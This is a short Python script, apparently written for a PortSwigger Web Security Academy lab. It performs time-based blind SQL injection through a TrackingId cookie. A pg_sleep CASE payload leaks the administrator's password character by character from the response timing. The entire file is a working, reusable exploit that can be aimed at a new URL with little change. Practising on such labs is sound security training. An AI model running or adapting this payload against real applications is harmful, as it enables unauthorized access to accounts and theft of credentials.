import requests
import string

# Base character set
base = string.ascii_lowercase + string.ascii_uppercase + string.digits

# Initialize password
p = ""

# Create a session
session = requests.Session()

# Headers for the request
headers = {
    "Cache-Control": "max-age=0",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3",
    "Upgrade-Insecure-Requests": "1",
    "Connection": "close",
    "User-Agent": "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3877.0 Safari/537.36",
    "Accept-Encoding": "gzip, deflate",
    "Accept-Language": "en-US,en;q=0.9"
}

# Target URL
url = "https://0a35001103dd95b5809353b100c00047.web-security-academy.net/"

# Iterate over each position in the password
for i in range(1, 21):
    for c in base:
        # Set cookies for SQL injection
        cookies = {
            "TrackingId": f"6hVWELZ0Hxp48ugJ'||(select case when(username='administrator' and substring(password,{i},1)='{c}') then pg_sleep(10) else pg_sleep(0) end from users)||'z",
            "session": "ADwAGXDatCejU0vjwyAtrmXfFAlZocp3"
        }

        try:
            # Make the request
            req = session.get(url, headers=headers, cookies=cookies)
            t = req.elapsed.total_seconds()
            if t >= 10:
                p += c
                print(p)
                break
        except requests.RequestException as e:
            print(f"An error occurred: {e}")
            continue

# Final password
print(f'[+] Password: [{p}]')